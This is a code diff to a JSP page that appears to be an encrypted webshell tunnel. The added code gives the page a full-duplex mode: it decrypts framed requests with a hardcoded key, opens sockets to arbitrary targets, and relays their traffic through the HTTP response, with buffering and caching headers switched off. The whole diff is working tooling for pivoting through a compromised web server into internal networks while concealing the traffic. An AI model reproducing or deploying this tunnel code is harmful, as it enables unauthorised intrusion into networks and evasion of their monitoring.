@@ -169,6 +169,54 @@ void writeFrame(JspWriter jw, int typeByte, byte[] data) throws Exception {
     jw.flush();
 }
 
+// 用 OutputStream 写帧（全双工模式）
+void writeFrameOS(OutputStream os, int typeByte, byte[] data) throws Exception {
+    byte[] payload = new byte[1 + data.length]; payload[0] = (byte) typeByte;
+    cp(data, 0, payload, 1, data.length);
+    byte[] encrypted = enc(payload, KEY);
+    byte[] lenBuf = new byte[]{(byte)((encrypted.length>>24)&0xFF),(byte)((encrypted.length>>16)&0xFF),
+        (byte)((encrypted.length>>8)&0xFF),(byte)(encrypted.length&0xFF)};
+    os.write(lenBuf);
+    os.write(encrypted);
+    os.flush();
+}
+
+// 从 InputStream 读取一个帧（4字节长度 + 加密数据）→ 返回 type+data 或 null
+byte[] readFrameFromStream(InputStream is) throws Exception {
+    byte[] lenBuf = new byte[4];
+    int total = 0;
+    while (total < 4) { int n = is.read(lenBuf, total, 4 - total); if (n == -1) return null; total += n; }
+    int frameLen = ((lenBuf[0]&0xFF)<<24)|((lenBuf[1]&0xFF)<<16)|((lenBuf[2]&0xFF)<<8)|(lenBuf[3]&0xFF);
+    if (frameLen <= 0 || frameLen > 262144) return null;
+    byte[] frameBuf = new byte[frameLen];
+    total = 0;
+    while (total < frameLen) { int n = is.read(frameBuf, total, frameLen - total); if (n == -1) return null; total += n; }
+    byte[] decrypted = dec(frameBuf, KEY);
+    if (decrypted == null || decrypted.length < 1) return null;
+    return decrypted;
+}
+
+// 从 InputStream 读取完整 JSON 对象（不关闭 stream）
+String readJsonFromStream(InputStream is) throws Exception {
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    int depth = 0; boolean inStr = false; boolean esc = false;
+    int b;
+    while ((b = is.read()) != -1) {
+        bos.write(b);
+        char ch = (char) b;
+        if (inStr) {
+            if (esc) { esc = false; }
+            else if (ch == '\\') { esc = true; }
+            else if (ch == '"') { inStr = false; }
+        } else {
+            if (ch == '"') { inStr = true; }
+            else if (ch == '{') { depth++; }
+            else if (ch == '}') { depth--; if (depth == 0) break; }
+        }
+    }
+    return bos.toString("ISO-8859-1");
+}
+
 void classicReadLoop(long sid, Socket sock) {
     ConcurrentHashMap<String, LinkedBlockingQueue<byte[]>> queues = getQueues();
     byte[] buf = new byte[65536];
@@ -207,11 +255,125 @@ void halfDuplexReadLoop(int sid, Socket sock, JspWriter jw,
     }
 }
 
+// 全双工：后台线程读目标 socket → 写到 response OutputStream
+void fullDuplexReadLoop(int sid, Socket sock, final OutputStream ros) {
+    byte[] buf = new byte[65536];
+    try {
+        InputStream is = sock.getInputStream();
+        while (!sock.isClosed()) {
+            int n = is.read(buf);
+            if (n == -1) break;
+            byte[] chunk = Arrays.copyOf(buf, n);
+            synchronized (ros) { writeFrameOS(ros, 0x01, chunk); ros.flush(); }
+        }
+    } catch (Exception e) {}
+    finally {
+        try { synchronized (ros) { writeFrameOS(ros, 0x02, new byte[0]); ros.flush(); } } catch (Exception e) {}
+        try { sock.close(); } catch (Exception e) {}
+        getSessions().remove((long)sid);
+    }
+}
+
 String b64e(byte[] b) { return java.util.Base64.getEncoder().encodeToString(b); }
 byte[] b64d(String s) { return java.util.Base64.getDecoder().decode(s); }
-%><%
-out.clear();
 
+%><%
+// 检测是否为全双工请求
+String reqCT = request.getContentType();
+boolean isFullDuplexReq = reqCT != null && reqCT.startsWith("application/octet-stream");
+
+if (isFullDuplexReq) {
+    // === 全双工模式 ===
+    // 使用 req.getInputStream() + resp.getOutputStream() 实现单连接双向流
+    try {
+        InputStream reqIS = request.getInputStream();
+
+        // 1. 读取初始 JSON body
+        String body = readJsonFromStream(reqIS);
+        String action = jStr(body, "a");
+
+        if (!"f".equals(action)) {
+            out.clear();
+            out.print("{\"d\":\"\"}");
+            out = pageContext.pushBody();
+            return;
+        }
+
+        // 2. 解析 SYN，连接目标
+        String rd = jStr(body, "d");
+        if (rd == null) {
+            out.clear(); out = pageContext.pushBody();
+            return;
+        }
+        byte[] raw = dec(b64d(rd), KEY);
+        if (raw == null || raw.length < 2) {
+            out.clear(); out = pageContext.pushBody();
+            return;
+        }
+        byte[] synDataBytes = parseSynData(raw);
+        int[] synInfo = parseSyn(raw);
+        if (synDataBytes == null || synInfo == null) {
+            out.clear(); out = pageContext.pushBody();
+            return;
+        }
+
+        final int sid = synInfo[0]; final int seq = synInfo[1];
+
+        // 清空 JspWriter，切换到 ServletOutputStream
+        out.clear();
+        out = pageContext.pushBody();
+        response.setBufferSize(16384);
+        response.setContentType("application/octet-stream");
+        response.setHeader("X-Accel-Buffering", "no");
+        response.setHeader("Cache-Control", "no-cache");
+
+        final OutputStream ros = response.getOutputStream();
+
+        Socket sock = connectTarget(synDataBytes);
+        if (sock == null) {
+            // 连接失败
+            ByteArrayOutputStream fb = new ByteArrayOutputStream();
+            fb.write(0); fb.write(1); fb.write(mkPkt(0x00, sid, 0, seq, new byte[0]));
+            writeFrameOS(ros, 0x00, fb.toByteArray());
+            ros.flush(); response.flushBuffer();
+            return;
+        }
+
+        getSessions().put((long)sid, sock);
+
+        // 3. 发送 ACK 帧
+        synchronized (ros) { writeFrameOS(ros, 0x00, new byte[0]); }
+        ros.flush(); response.flushBuffer();
+
+        // 4. 启动后台线程：读目标 → 写 response
+        final Socket fsock = sock;
+        new Thread(new Runnable() { public void run() { fullDuplexReadLoop(sid, fsock, ros); } }).start();
+
+        // 5. 主线程循环：读 request → 写目标
+        try {
+            OutputStream sockOut = sock.getOutputStream();
+            while (!sock.isClosed()) {
+                byte[] frame = readFrameFromStream(reqIS);
+                if (frame == null) break;
+                byte typeByte = frame[0];
+                byte[] data = Arrays.copyOfRange(frame, 1, frame.length);
+                if (typeByte == 0x01 && data.length > 0) {
+                    sockOut.write(data);
+                } else if (typeByte == 0x02) {
+                    break;
+                }
+            }
+        } catch (Exception e) {}
+        finally {
+            try { sock.close(); } catch (Exception e) {}
+            getSessions().remove((long)sid);
+        }
+    } catch (Exception e) {}
+    return;
+}
+
+// === 非全双工模式：标准 JSON 处理 ===
+out.clear();
 StringBuilder sb = new StringBuilder();
 BufferedReader br = request.getReader();
 char[] cbuf = new char[8192]; int rn;
